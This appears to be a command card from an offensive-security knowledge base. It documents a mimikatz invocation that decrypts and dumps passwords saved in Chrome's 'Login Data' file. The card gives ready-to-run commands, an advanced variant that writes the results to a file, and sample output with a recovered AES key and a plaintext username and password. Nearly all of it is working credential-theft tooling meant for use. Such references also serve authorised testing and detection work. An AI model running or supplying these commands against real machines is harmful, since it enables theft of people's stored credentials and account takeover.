---
id: 555b2e1c-f04c-434a-958a-2b451f62526a
name: mimikatz-extract-chrome-passwords
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::chrome
  /in:"""%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login
  Data""" /unprotect" "exit"
output: >-
  C:\Windows\System32\spool\drivers\color>mimikatz.exe "dpapi::chrome
  /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login
  Data""" /unprotect" "exit"

    .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

  mimikatz(commandline) # dpapi::chrome
  /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data"
  /unprotect

  > Encrypted Key found in local state file

  > Encrypted Key seems to be protected by DPAPI
   * using CryptUnprotectData API
  > AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4


  URL     : http://10.10.1.1/ ( http://10.10.1.1/ )

  Username: admin
   * using BCrypt with AES-256-GCM
  Password: SuP3rUnCr4cK4B73


  mimikatz # exit

  Bye!
created_at: '2020-07-21T00:02:06.198050+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - chrome
  - credential-access
verified: true
validated: true
---

# mimikatz-extract-chrome-passwords

## Command

```cmd
mimikatz.exe "dpapi::chrome /in:"""%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

## Description

This command uses Mimikatz to decrypt and extract saved passwords from Chrome's 'Login Data' SQLite database. It requires running in the target user's context to access DPAPI-protected data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /in:PATH | Path to the 'Login Data' file (use quotes for spaces) | Yes |
| /unprotect | Decrypt using DPAPI and AES keys from Local State | Yes |
| %USERPROFILE% | Expands to current user's profile path | Built-in |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::chrome /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

### Advanced Usage

```cmd
mimikatz.exe "dpapi::chrome /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data""" /unprotect /out:creds.txt" "exit"
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4

URL     : http://10.10.1.1/ ( http://10.10.1.1/ )
Username: admin
 * using BCrypt with AES-256-GCM
Password: SuP3rUnCr4cK4B73

mimikatz # exit
Bye!
```

## Related

- [[commands/mimikatz-extract-chrome-cookies]]
- [[procedures/Extract-Chrome-Cookies-and-Passwords-From-Current-User-Profile]]
